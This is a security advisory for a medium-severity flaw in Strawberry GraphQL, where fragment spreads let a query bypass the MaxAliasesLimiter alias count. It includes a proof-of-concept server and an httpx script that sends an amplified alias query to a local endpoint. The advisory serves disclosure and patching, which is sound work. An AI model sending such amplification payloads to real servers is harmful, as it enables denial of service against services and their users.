# [M] Strawberry GraphQL's Bypass of MaxAliasesLimiter via Fragment Spreads leading to GraphQL Alias Amplification

## Summary
Severity: Medium
Advisory: GHSA-fr49-mhgj-crfc
CVE: CVE-2026-47707
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-fr49-mhgj-crfc
Type: github-advisory

## Affected
- PyPI: `strawberry-graphql` — affected >=0.172.0 <0.315.7

## Details
### Summary
The MaxAliasesLimiter extension in Strawberry fails to account for the multiplicative/amplification effect of FragmentSpreadNode. While it correctly counts static aliases within the AST it does not consider how many times a fragments internal aliases are expanded during execution. this allows an attacker to bypass alias limits and force the server to resolve and render a significantly higher number of aliases than allowed, potentially leading to a  dos via resource exhaustion.

### Details
The current implementation of alias counting in strawberry/extensions/max_aliases.py uses a static approach
```
for selection in selection_set_owner.selection_set.selections: 
    if isinstance(selection, FieldNode) and selection.alias:
        result += 1

    if isinstance(selection, (FieldNode, InlineFragmentNode)) and ~~~:
        result += count_fields_with_alias(selection)
```

When a FragmentSpread is used multiple times, the actual number of aliases processed by the execution engine is

**Total Aliases = query aliases + (num of spreads * aliases within fragment)**

Because Strawberry only performs a static sum of the text, it misses this multiplication

### PoC
**server code**
```
import strawberry
from fastapi import FastAPI
from strawberry.fastapi import GraphQLRouter
from strawberry.extensions import MaxAliasesLimiter

@strawberry.type
class User:
    name: str = "GONA"

@strawberry.type
class Query:
    @strawberry.field
    def user(self) -> User:
        return User()

# Limit is set to 20 aliases
schema = strawberry.Schema(
    query=Query, 
    extensions=[MaxAliasesLimiter(max_alias_count=20)]
)

app = FastAPI()
app.include_router(GraphQLRouter(schema), prefix="/graphql")
```

**payloads**
```
import httpx

payload = {
    "query": """
        fragment Amplification on User {
            a1: name, a2: name, a3: name, a4: name, a5: name,
            a6: name, a7: name, a8: name, a9: name, a10: name
        }
        query Bypass {
            u1: user { ...Amplification }
            u2: user { ...Amplification }
            u3: user { ...Amplification }
            u4: user { ...Amplification }
            u5: user { ...Amplification }
            u6: user { ...Amplification }
            u7: user { ...Amplification }
            u8: user { ...Amplification }
            u9: user { ...Amplification }
            u10: user { ...Amplification }
        }
    """
}

response = httpx.post("http://127.0.0.1:8000/graphql", json=payload)
print(f"Status: {response.status_code}")
# The response will contain 100 'a' aliases nested within 10 'u' aliases.
print(response.json())
```

### Impact
An attacker can bypass security constraints to cause Application-level DOS. By staying just under the max_alias_count limit in the AST an attacker can trigger thousands of actual alias resolutions on the backend consuming excessive CPU and memory

## References
- https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-fr49-mhgj-crfc
- https://nvd.nist.gov/vuln/detail/CVE-2026-47707
- https://github.com/strawberry-graphql/strawberry
- https://github.com/strawberry-graphql/strawberry/releases/tag/0.315.7
